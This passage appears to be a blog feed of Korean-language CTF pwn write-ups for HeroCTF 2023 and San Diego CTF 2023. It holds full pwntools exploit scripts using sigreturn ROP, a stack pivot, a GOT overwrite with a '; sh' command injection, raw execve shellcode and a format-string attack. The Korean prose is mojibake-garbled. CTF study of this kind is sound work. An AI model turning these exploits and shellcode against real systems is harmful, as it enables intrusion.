í•˜ì§€ë§Œ ê¸¸ì´ê°€ ì§§ê¸° ë•Œë¬¸ì— ì–´ë”˜ê°€ì— <code>payload</code>ë¥¼ ì €ìž¥í•˜ê³  ê·¸ ê³³ìœ¼ë¡œ ë›¸ ìƒê°ì„ 1ì°¨ì ìœ¼ë¡œ í•´ì•¼í•œë‹¤.</p><p><code>motivation_letter</code>ì— ìž…ë ¥ë°›ëŠ” ì‚¬ì´ì¦ˆê°€ í¬ê¸° ë•Œë¬¸ì— ì ì ˆí•´ë³´ì˜€ë‹¤. ì—¬ê¸°ì— <code>rop_payload</code>ë¥¼ ì €ìž¥í•˜ê³  ë›°ì–´ì•¼ê² ë‹¤. ê·¸ë¦¬ê³  <code>execve</code> í•¨ìˆ˜ ì¸ìž <code>/bin/sh</code>ë¥¼ ì €ìž¥í•´ì•¼ê² ë‹¤.</p><p><code>sigreturn rop</code>ë¥¼ í•  ë•Œ ê°€ìž¥ ì£¼ì˜í•´ì•¼ í•  ì ì€ <code>rax</code> ë ˆì§€ìŠ¤í„°ì˜ í¬ê¸°ë¥¼ ìžŠì§€ ì•Šê³  <code>0xf</code>ë¡œ ë§žì¶°ì£¼ê³  <code>syscall ; ret</code>ë¥¼ ì‹¤í–‰í•´ì•¼í•œë‹¤ëŠ” ê²ƒì´ë‹¤.</p><p><code>stack pivoting</code>í•  ë•Œ ê°€ì ¯ ë©ì–´ë¦¬ë“¤ ë³´ë©´ì„œ ë‹¨ìˆœí•˜ê²Œ <code>leave ; ret</code>ì´ ì•ˆë³´ì—¬ì„œ ë‹¹í™©í•  ìˆ˜ë„ ìžˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401114                 mov     rsp, rbp</span><br><span class="line">.text:0000000000401117                 pop     rbp</span><br><span class="line">.text:0000000000401118                 retn</span><br></pre></td></tr></table></figure><p>ì´ ë¬¸ì œëŠ” ì–´ì…ˆë¸”ë¦¬ë¡œ ì“°ì—¬ì¡Œê¸° ë•Œë¬¸ì— ìœ„ ì–´ì…ˆë¸”ë¦¬ê°€ <code>leave ; ret</code>ìž„ì„ ëˆˆì¹˜ì±„ì•¼ í•œë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>stack pivoting í•˜ëŠ” ë²•</p><ol><li>rbpë¥¼ jumpí•˜ê³  ì‹¶ì€ ì£¼ì†Œ -8ë¡œ ì„¸íŒ… (rop ê°€ì ¯ì´ ìžˆëŠ” ê³³ - 8)</li><li>retë¥¼ leave_retì£¼ì†Œë¡œ ë³€ê²½</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./ropedancer&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ropedancer&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;static-03.heroctf.fr&#x27;</span>, <span class="number">5002</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;?&#x27;</span>, p32(<span class="number">0xA736579</span>))</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x000000000040102f</span></span><br><span class="line">motivation_letter = <span class="number">0x40312C</span></span><br><span class="line">xor_rax_inc_rax = <span class="number">0x0000000000401011</span></span><br><span class="line">inc_rax = <span class="number">0x401013</span></span><br><span class="line">leave_ret = <span class="number">0x401114</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame(arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">0x3b</span></span><br><span class="line">frame.rdi = motivation_letter+<span class="number">0x178</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>)</span><br><span class="line">payload += p64(motivation_letter - <span class="number">8</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. rbpë¥¼ jumpí•˜ê³  ì‹¶ì€ ì£¼ì†Œ -8ë¡œ ì„¸íŒ… (rop ê°€ì ¯ì´ ìžˆëŠ” ê³³ - 8)</span></span><br><span class="line"><span class="comment"># 2. retë¥¼ leave_retì£¼ì†Œë¡œ ë³€ê²½</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">stack_pivot = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">stack_pivot += p64(xor_rax_inc_rax) <span class="comment"># 1</span></span><br><span class="line">stack_pivot += p64(inc_rax) * <span class="number">14</span></span><br><span class="line"></span><br><span class="line">stack_pivot += p64(syscall)</span><br><span class="line">stack_pivot += <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(stack_pivot)))</span><br><span class="line">stack_pivot += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, stack_pivot)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Hero </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack pivoting </tag>
            
            <tag> srop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hero CTF 2023 - Appointment Book (*addr = value)</title>
      <link href="/230518-heroctf2023-appointment-book/"/>
      <url>/230518-heroctf2023-appointment-book/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1951">https://ctftime.org/event/1951</a></li></ul><blockquote><p>Exploit this application to get the flag!<br>Host : nc static-03.heroctf.fr 5000<br>Format : Hero{flag}<br>Author : SoEasY<br>easy</p></blockquote><ul><li>[68 solves &#x2F; 298 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;========== Welcome to your appointment book. ==========&quot;</span>);</span><br><span class="line">  v5 = time(<span class="number">0LL</span>);</span><br><span class="line">  local_time = timestamp_to_date(v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[LOCAL TIME] %s\n&quot;</span>, local_time);</span><br></pre></td></tr></table></figure><p>ì²˜ìŒì— main í•¨ìˆ˜ì—ì„œ <code>local_time</code>ì„ ì¶œë ¥í•´ì¤€ë‹¤. ì™œ ì¶œë ¥í•´ì£¼ëŠ”ì§€ ìƒê°ì„ ê¼­ í•´ì•¼í•œë‹¤. ì¶œë ¥í•´ ì¤€ ë‹¤ìŒ ì—¬ëŸ¬ ë©”ë‰´ë“¤ì´ ìžˆëŠ”ë° <code>create_appointment</code> ë©”ë‰´ë§Œ ë³´ë©´ ëœë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_appointment</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 value; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 *addr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Enter the index of this appointment (0-7): &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx); <span class="comment">// oob</span></span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( idx &gt; <span class="number">7</span> );</span><br><span class="line">  addr = (&amp;appointments + <span class="number">16</span> * idx);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Enter a date and time (YYYY-MM-DD HH:MM:SS): &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">30</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  value = date_to_timestamp(s);</span><br><span class="line">  *addr = value; <span class="comment">// ì›í•˜ëŠ” ì£¼ì†Œì— ì›í•˜ëŠ” ê°’ ì“°ê¸° ê°€ëŠ¥</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Converted to UNIX timestamp using local timezone: %ld\n&quot;</span>, *addr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Enter an associated message (place, people, notes...): &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(v4, <span class="number">62</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  addr[<span class="number">1</span>] = v4;</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>idx</code>ê°€ <code>int</code> ìžë£Œí˜•ì„ ê°€ì§€ê³  ìžˆê¸° ë•Œë¬¸ì— <code>oob</code>ê°€ ë°œìƒí•œë‹¤. ì´ ì¸ë±ìŠ¤ë¥¼ ê°€ì§€ê³  <code>addr</code> ë³€ìˆ˜ ìœ„ë¡œ ì ‘ê·¼í•  ìˆ˜ ìžˆë‹¤. ìœ„ì—ëŠ” <code>got</code>ë“¤ì´ ìžë¦¬ìž¡ê³  ìžˆëŠ”ë° ì›í•˜ëŠ” ê³³ì— ì ‘ê·¼í•´ì„œ ì›í•˜ëŠ” ê°’ì„ ì“¸ ìˆ˜ ìžˆë‹¤. <code>system(&quot;/bin/sh&quot;)</code>ë¥¼ í˜¸ì¶œí•˜ëŠ” í•¨ìˆ˜ë¥¼ ì •ì˜í•´ë†¨ê¸° ë•Œë¬¸ì— ì´ í•¨ìˆ˜ ì£¼ì†Œë¥¼ ì“°ë©´ ë  ë“¯ í•˜ë‹¤.</p><p>ì´ë•Œ ì£¼ì˜í•´ì•¼í•  ì ì´ ì“°ê³  ì‹¶ì€ ì£¼ì†Œ ê°’ì„ <code>YYYY-MM-DD HH:MM:SS</code> í˜•ì‹ìœ¼ë¡œ ë§Œë“¤ì–´ì„œ ìž…ë ¥í•´ì•¼ <code>date_to_timestamp</code> í•¨ìˆ˜ë¥¼ ê±°ì³ ì •ìƒì ì¸ ì£¼ì†Œ ê°’ì„ ì“¸ ìˆ˜ ìžˆê²Œ ëœë‹¤. ê·¸ëž˜ì„œ idaì—ì„œ <code>date_to_timestamp</code> í•¨ìˆ˜ êµ¬í˜„ì„ ë³´ê³  cë¡œ ìž¬ìž‘ì„±í•˜ì˜€ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// timestamp_to_date</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tp</span>;</span></span><br><span class="line"><span class="type">time_t</span> timer;</span><br><span class="line"><span class="type">char</span>* s;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    timer = atoll(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// scanf(&quot;%ld&quot;, &amp;timer);</span></span><br><span class="line">    s = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    tp = localtime(&amp;timer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !tp )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Error converting the UNIX timestamp to a date and time&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    strftime(s, <span class="number">0x20</span>uLL, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, tp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ë¬¸ì œì—ì„œ ì •ì˜í•´ì¤€ ì‹œìŠ¤í…œ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ë„ ë˜ì§€ë§Œ ì´ê²Œ ì—†ë”ë¼ë„ ìµìŠ¤í•  ìˆ˜ ìžˆë‹¤. <code>free</code>ì˜ <code>got</code>ë¥¼ <code>system</code>ìœ¼ë¡œ ë®ê³  command injectionì„ ì´ìš©í•´ì„œ ì›í•˜ëŠ” ê°’ì„ ë„£ì„ ë•Œ <code>; sh</code>ë„ í•¨ê»˜ ë„£ì–´ì£¼ì—ˆë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>ì²˜ìŒì— ë¡œì»¬ì—ì„œëŠ” ìž˜ ë˜ì—ˆëŠ”ë° ë¦¬ëª¨íŠ¸ëŠ” ì£½ì–´ë„ ë˜ì§ˆ ì•Šì•˜ë‹¤. ê·¸ ì´ìœ ëŠ” ë¡œì»¬ê³¼ ë¦¬ëª¨íŠ¸ì˜ <code>local_time</code>ì´ ë‹¤ë¥´ê¸° ë•Œë¬¸ì´ë‹¤. ë¬¸ì œ ì´ˆë°˜ì— ì¶œë ¥ì„ í•´ì£¼ë¯€ë¡œ íƒ€ìž„ì¡´ì„ ì•Œì•„ë‚´ì„œ <code>TZ</code> í™˜ê²½ë³€ìˆ˜ë¥¼ ì•„ëž˜ì²˜ëŸ¼ ë°”ê¿”ì£¼ì—ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TZ=IS</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./appointment_book&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./appointment_book&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;static-03.heroctf.fr&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># export TZ=IS</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;-13&#x27;</span>)</span><br><span class="line"></span><br><span class="line">timestr = subprocess.check_output([<span class="string">&#x27;./timestamp_to_date&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x401180</span>)]).strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(timestr))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, timestr + <span class="string">b&#x27; ; sh&#x27;</span>)</span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;:&#x27;, &#x27;1970-02-18 15:27:02&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hero&#123;Unch3ck3d_n3g4t1v3_1nd3x_1nt0_G0T_0v3wr1t3_g03s_brrrrrr&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Hero </category>
          
      </categories>
      
      
        <tags>
            
            <tag> command injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>San Diego CTF 2023 Write ups</title>
      <link href="/230515-sandiegoctf2023-PWN/"/>
      <url>/230515-sandiegoctf2023-PWN/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1910">https://ctftime.org/event/1910</a></li></ul><p>1ì£¼ì¼ ë’¤ì—ë‚˜ ìž‘ì„±í•˜ëŠ” Write ups.. í•œ ë¬¸ì œ ë¹¼ê³  ë‹¤ í’€ì—ˆëŠ”ë° ëª» í‘¼ ë¬¸ì œëŠ” ë„ˆë¬´ ê·¹ì•…ì˜ fsbì˜€ë‹¤. ë‚˜ë¨¸ì§€ ë¬¸ì œëŠ” ì‰½ê²Œ í’€ì´í–ˆë˜ ê±¸ë¡œ ê¸°ì–µ. </p><h2 id="Turtle-Shell"><a href="#Turtle-Shell" class="headerlink" title="Turtle Shell"></a>Turtle Shell</h2><blockquote><p>A turtle without itâ€™s shell is a sad sight to see<br>Connect via:Â <code>nc turtle.sdc.tf 1337</code><br>DockerfileÂ turtle-shell</p></blockquote><ul><li>[111 solves &#x2F; 100 points]</li></ul><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./turtle-shell&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;turtle.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./turtle-shell&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># sdctf&#123;w0w_y0u_m4d3_7h3_7urT13_c0m3_0u7_0f_1t5_5h3l1&#125;</span></span><br></pre></td></tr></table></figure><h2 id="money-printer"><a href="#money-printer" class="headerlink" title="money-printer"></a>money-printer</h2><blockquote><p>The first step to getting rich is printing money<br>Connect via:Â <code>nc money.sdc.tf 1337</code><br>DockerfileÂ money-printer</p></blockquote><ul><li>[140 solves &#x2F; 150 points]</li></ul><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./money-printerp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;money.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./money-printerp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. exit@got -&gt; main</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">16</span>,</span><br><span class="line">        &#123;e.got[<span class="string">&#x27;exit&#x27;</span>] : e.symbols[<span class="string">&#x27;main&#x27;</span>] &#125;)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#51</span></span><br><span class="line"><span class="comment"># - 0x21c87</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%57$p&#x27;</span></span><br><span class="line"><span class="comment"># payload = b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x21c87</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># system = libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># printf@got -&gt; system</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">16</span>,</span><br><span class="line">        &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])[:<span class="number">4</span>] &#125;,</span><br><span class="line">        write_size = <span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;?\n&#x27;, &#x27;-1&#x27;)</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;?\n&#x27;, &#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># -1</span></span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line"><span class="comment"># sdctf&#123;d4mn_y0u_f0unD_4_Cr4zY_4M0uN7_0f_M0n3y&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Canary                        : âœ“ (value: 0xedabb8ef1d292700)</span></span><br><span class="line"><span class="comment"># NX                            : âœ“</span></span><br><span class="line"><span class="comment"># PIE                           : âœ˜</span></span><br><span class="line"><span class="comment"># Fortify                       : âœ˜</span></span><br><span class="line"><span class="comment"># RelRO                         : Partial</span></span><br></pre></td></tr></table></figure><h2 id="tROPic-thunder"><a 